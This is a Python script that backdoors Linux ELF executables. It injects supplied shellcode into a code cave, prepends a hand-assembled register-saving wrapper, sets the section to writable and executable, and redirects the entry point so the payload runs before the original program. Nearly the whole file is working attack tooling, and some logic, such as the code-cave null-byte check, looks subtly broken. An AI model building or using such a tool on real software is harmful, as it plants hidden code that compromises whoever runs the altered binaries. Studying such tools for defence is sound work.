#!/usr/bin/env python3

import sys
sys.dont_write_bytecode = True

from argparse import ArgumentParser
from ELF.ELF import ELF
from ELF.ELFEnum import *
import struct

prettyHex = lambda x: (hex(x) if isinstance(x, int) else ' '.join(hex(i) for i in x))

def gen_sc_wrapper_32(legit_e_entry, new_e_entry, shellcode):
    sc_wrapper  = b""
    sc_wrapper += b"\xe8\x00\x00\x00\x00\x54\x50\x53\x51\x52\x55\x56\x57" # pushes
    sc_wrapper += b"\xcc"
    sc_wrapper += shellcode
    sc_wrapper += b"\x5f\x5e\x5d\x5a\x59\x5b\x58\x5c\x5b\x81\xeb" # popes
    sc_wrapper += new_e_entry
    sc_wrapper += b"\x81\xc3"
    sc_wrapper += legit_e_entry
    sc_wrapper += b"\x53\xc3"

    return sc_wrapper

def gen_sc_wrapper_64(legit_e_entry, new_e_entry, shellcode):
    sc_wrapper  = b""
    sc_wrapper += b"\xe8\x00\x00\x00\x00\x54\x50\x53\x51\x52\x55\x56\x57\x41\x50\x41\x51\x41\x52\x41\x53\x41\x54\x41\x55\x41\x56\x41\x57" # pushes
    sc_wrapper += b"\xcc"
    sc_wrapper += shellcode
    sc_wrapper += b"\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59\x41\x58\x5f\x5e\x5d\x5a\x59\x5b\x58\x5c\x5b\x48\x81\xeb" # popes
    sc_wrapper += new_e_entry
    sc_wrapper += b"\x48\x81\xc3"
    sc_wrapper += legit_e_entry
    sc_wrapper += b"\x53\xc3"

    return sc_wrapper


def get_args():
    p = ArgumentParser()
    p.add_argument("-b", "--binary", help="Binary path to backdoor")
    p.add_argument("-s", "--shellcode", help="Path to the raw shellcode (file)")
    p.add_argument("-l", "--location", help="Hex value of where to put the shellcode")

    return p.parse_args()


def main():
    args = get_args()

    with open(args.binary, "rb") as f:
        binData = f.read()

    elf = ELF(binData)

    with open(args.shellcode, "rb") as f:
        shellcode = f.read()

    loc = int(args.location, 16)

    if elf.ei_mag != b"\x7f\x45\x4c\x46":
        print("[!] Binary is not an ELF file. Exiting...")
        return 1

    safe_cc = True
    for i in (elf.elf_file[loc], elf.elf_file[loc]+len(shellcode), 1):
        off = loc+i
        if elf.elf_file[off] != 0x00:
            print(f"Non null byte found in codecave at offset {prettyHex(off)}: {prettyHex(elf.elf_file[off])}")
            safe_cc = False

    if not safe_cc:
        print("[!] Warning: selected codecave doesn't only contain null bytes")

    legit_loc  = elf.e_entry
    print(legit_loc)
    gen_sc_wrapper = gen_sc_wrapper_64 if elf.ei_class == ELFHeaderEnum.Class.ELF64.value else gen_sc_wrapper_32

    sc = gen_sc_wrapper(elf.p("I", legit_loc), elf.p("I", loc+5), shellcode)

    secid     = elf.get_section_id_from_offset(loc)
    print(loc+len(sc))
    end_secid = elf.get_section_id_from_offset(loc+len(sc))

    phid      = elf.get_prog_hdr_id_from_offset(loc)
    end_phid  = elf.get_prog_hdr_id_from_offset(loc+len(sc))
    print(end_phid)

    if not phid:
        print("[x] Error, location is outside of a program header.")
        return

    elif not end_phid:
        print(f"[!] Program header {ProgramHeaderEnum.Type(elf.program_headers[phid].p_type).name} is finishing before the end of the shellcode.")
        resp = input(f"[?] Should we increase its size? [Y/n] ")
        if resp.lower() == 'y':
            print(f"[*] Previous size: {elf.program_headers[phid].p_filesz} Bytes")
            elf.program_headers[phid].p_filesz = elf.program_headers[phid].p_filesz + len(sc)
            elf.program_headers[phid].p_memsz = elf.program_headers[phid].p_memsz + len(sc)
            print(f"[*] New size: {elf.program_headers[phid].p_filesz} Bytes")

    elif elf.program_headers[phid].p_type != elf.program_headers[end_phid].p_type:
        print("[x] Error! The shellcode is overlapping 2 program headers. Find another place.")
        elf.program_headers[phid].print_program_header()
        elf.program_headers[end_phid].print_program_header()
        return


    if not secid:
        print("[x] Error, location is outside of a section.")
        return

    elif not end_secid:
        print(f"[!] Section {elf.section_headers[secid].sh_name_str} is finishing before the end of the shellcode.")
        resp = input(f"[?] Should we increase its size? [Y/n] ")
        if resp.lower() == 'y':
            print(f"[*] Previous size: {elf.section_headers[secid].sh_size} Bytes")
            elf.section_headers[secid].sh_size = elf.section_headers[secid].sh_size + len(sc)
            print(f"[*] New size: {elf.section_headers[secid].sh_size} Bytes")

    elif elf.section_headers[secid].sh_name != elf.section_headers[end_secid].sh_name:
        print("[x] Error! The shellcode is overlapping 2 sections. Find another place.")
        elf.section_headers[secid].print_section_header()
        elf.section_headers[end_secid].print_section_header()
        return


    print("[+] Setting PF_X, PF_W and PF_R program header flags...")
    elf.program_headers[phid].setFlags(ProgramHeaderEnum.Flags.PF_X.value | ProgramHeaderEnum.Flags.PF_W.value | ProgramHeaderEnum.Flags.PF_R.value)
    print(f"[*] Program header flags: {elf.program_headers[phid].prettyFlags()}")

    print("[+] Setting SHF_EXECINSTR and SHF_WRITE section flags...")
    elf.section_headers[secid].setFlags(SectionHeaderEnum.Flags.SHF_EXECINSTR.value | SectionHeaderEnum.Flags.SHF_WRITE.value)
    print(f"[*] Section flags: {elf.section_headers[secid].prettyFlags()}")


    elf.e_entry = loc \
        if elf.ei_class == ELFHeaderEnum.Class.ELF64 \
        else loc + elf.program_headers[phid].p_vaddr

    elf.elf_file[loc:loc+len(sc)] = sc

    newBinData = elf.build_elf()

    with open(f"./{args.binary.split('/')[-1]}.bdoor", "wb") as f:
        f.write(newBinData)

    print(f"[+] Backdoored file written at ./{args.binary.split('/')[-1]}.bdoor!")

    return 0



if __name__=='__main__':
    exit(main())
